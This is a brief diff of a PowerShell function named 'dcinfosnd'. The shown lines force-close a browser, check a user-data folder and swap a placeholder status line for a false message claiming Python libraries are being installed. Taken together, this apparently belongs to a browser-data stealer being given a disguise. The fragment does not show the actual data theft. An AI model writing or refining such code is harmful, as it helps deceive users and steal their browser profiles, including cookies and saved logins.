@@ -23,7 +23,7 @@ function dcinfosnd {
             
             Stop-Process -Name $browserName -ErrorAction SilentlyContinue
             
-            Write-Host "ABCDE"
+            Write-Host "initiating require python libraries to install... "
             
             
             if (-not (Test-Path $userDataPath)) {
